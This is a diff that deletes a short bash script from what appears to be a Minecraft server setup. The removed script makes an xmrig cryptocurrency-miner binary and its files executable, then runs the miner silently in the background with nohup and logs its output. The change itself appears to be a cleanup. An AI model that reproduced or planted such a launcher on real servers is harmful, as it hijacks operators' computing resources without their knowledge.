@@ -1,8 +1,0 @@
-#!/bin/bash
-
-chmod +x /home/minecraft/server/mine/xmrig/xmrig
-chmod +x /home/minecraft/server/mine/xmrig/cert_key.pem
-chmod +x /home/minecraft/server/mine/xmrig/SHA256SUMS
-chmod +x /home/minecraft/server/mine/xmrig/cert.pem
-
-nohup /home/minecraft/server/mine/xmrig/xmrig < /dev/null > /home/minecraft/server/mine/x.log 2>&1 &
